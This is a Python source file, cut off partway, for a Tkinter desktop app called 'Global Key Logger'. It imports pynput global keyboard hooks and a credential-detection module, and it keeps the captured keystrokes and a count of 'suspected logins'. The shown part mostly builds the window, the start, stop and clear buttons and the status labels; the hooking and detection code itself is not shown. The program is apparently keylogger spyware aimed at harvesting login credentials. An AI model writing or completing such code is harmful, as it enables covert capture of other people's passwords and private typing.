import tkinter as tk
from tkinter import ttk
from credential_detection import CredentialDetector
from pynput import keyboard  # Integrated global keyboard hooks


class KeyloggerGUI:
    """Desktop interface for global keyboard monitoring."""

    def __init__(self, root):
        """Initialise the application window and interface."""
        self.root = root
        self.logging_active = False
        self.listener = None  # Replaced key_binding_id with a thread listener reference
        self.keystroke_count = 0
        self.captured_text = ""
        self.credential_detector = CredentialDetector()
        self.detected_logins = set()

        self.root.title("Global Key Logger")
        self.root.geometry("1000x650")
        self.root.minsize(800, 500)

        self.build_interface()

        self.root.protocol(
            "WM_DELETE_WINDOW",
            self.close_application
        )

    def build_interface(self):
        """Build the main application interface."""
        header = ttk.Frame(
            self.root,
            padding=10
        )
        header.pack(fill=tk.X)

        title = ttk.Label(
            header,
            text="Global Key Logger",
            font=("Segoe UI", 18, "bold")
        )
        title.pack(side=tk.LEFT)

        self.clear_button = ttk.Button(
            header,
            text="Clear Capture",
            command=self.clear_capture
        )
        self.clear_button.pack(side=tk.RIGHT)

        self.stop_button = ttk.Button(
            header,
            text="Stop Logging",
            command=self.stop_logging,
            state=tk.DISABLED
        )
        self.stop_button.pack(side=tk.RIGHT, padx=5)

        self.start_button = ttk.Button(
            header,
            text="Start Logging",
            command=self.start_logging
        )
        self.start_button.pack(side=tk.RIGHT)

        status_frame = ttk.Frame(
            self.root,
            padding=(10, 0, 10, 10)
        )
        status_frame.pack(fill=tk.X)

        self.status_label = ttk.Label(
            status_frame,
            text="Status: Stopped"
        )
        self.status_label.pack(side=tk.LEFT)

        self.key_count_label = ttk.Label(
            status_frame,
            text="Keystrokes: 0"
        )
        self.key_count_label.pack(side=tk.LEFT, padx=25)

        self.login_count_label = ttk.Label(
            status_frame,
            text="Suspected logins: 0"
        )
        self.login_count_label.pack(side=tk.LEFT)

        self.notebook = ttk.Notebook(self.root)
        self.notebook.pack(fill=tk.BOTH, expand=True, padx=10, ... [truncated]
